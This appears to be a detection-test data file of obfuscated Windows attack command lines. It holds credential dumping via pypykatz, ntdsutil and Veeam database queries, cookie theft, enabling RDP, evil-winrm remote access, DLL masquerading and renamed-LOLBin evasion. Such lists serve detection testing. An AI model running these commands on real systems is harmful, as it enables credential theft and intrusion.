target_commandline: copy C:\Python39\python.exe C:\temp\sys_runner.exe && C:\temp\sys_runner.exe -m pypykatz live registry
cmd.exe /c "set part1=HarddiskVolume && set part2=ShadowCopy && call mklink /D C:\temp\vss \\?\GLOBALROOT\Device\%part1%%part2%1"
echo snapshot "mount c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb" quit quit | ntdsutil.exe
%comspec% /c "set a=li& set b=st& call appcmd.exe %a%%b% config /section:identity"
copy "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe" C:\Temp\dbquery.exe && C:\Temp\dbquery.exe -S localhost -d VeeamBackup -Q "SELECT * FROM Credentials"

copy "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe" C:\Temp\custom_cmd.exe && C:\Temp\custom_cmd.exe -E -S localhost -Q "SELECT TOP 10 * FROM [VeeamBackup].[dbo].[Credentials]"
cmd.exe /c "set KEY=currentcontrolset\services && call reg.exe query HKLM\System\%KEY%"
copy C:\Python39\python.exe C:\Temp\runner.exe && C:\Temp\runner.exe -m adidnsdump -u DOMAIN\User -p Password ldap://10.10.10.10
echo Y | reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
copy C:\Ruby30-x64\bin\ruby.exe C:\temp\updater.exe && C:\temp\updater.exe evil-winrm.rb -i 10.0.0.5 -u Administrator -p Password123
copy certutil.exe totallynotcertutil.exe & totallynotcertutil.exe -encode input.txt output.txt
cmd.exe /V:ON /C "set a=in&& set b=voke&& set c=!a!!b!&& echo !c! | powershell -"
cmd.exe /c "set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \"{1}{0}\" -f 'st','Te' & %LAUNCH%"
mkdir C:\Temp\Extensions\ && copy DumpMinitool.exe C:\Temp\Extensions\DumpMinitool.exe && C:\Temp\Extensions\DumpMinitool.exe --file C:\Temp\memory.dmp --processId 752 --dumpType Full
cmd.exe /c "echo wlan show profile name=SSID key=clear | netsh.exe"
cmd.exe /c "set str1=gather & set str2=NetworkInfo.vbs & call wscript.exe C:\Windows\System32\%str1%%str2%"
cmd.exe /c "set a=Wscript.&& set b=Shell&& set c=Run&& call echo %a%%b%.%c%"
copy code.exe not_code.exe && not_code.exe tunnel service internal-run --log-file bypass.log
for /f "tokens=*" %a in ('wmic logicaldisk get name^,size^,freespace ^| findstr [A-Z]') do @echo %a
wmic os get Caption /value && wmic os get OSArchitecture /value && wmic os get Version /value
wmic useraccount where name='guest' set passwordexpires=0
wmic useraccount where name='guest' set passwordexpires=0

cd C:\test\ && copy malicious.dll photo.jpg && rundll32.exe .\photo.jpg,DllMain
copy payload.zip payload.txt && certutil -decodehex payload.txt payload.exe
cmd.exe /c "set A=\Microsoft\Teams& set B=\Cookies& call xcopy %APPDATA%%A%%B% C:\temp\ /E"
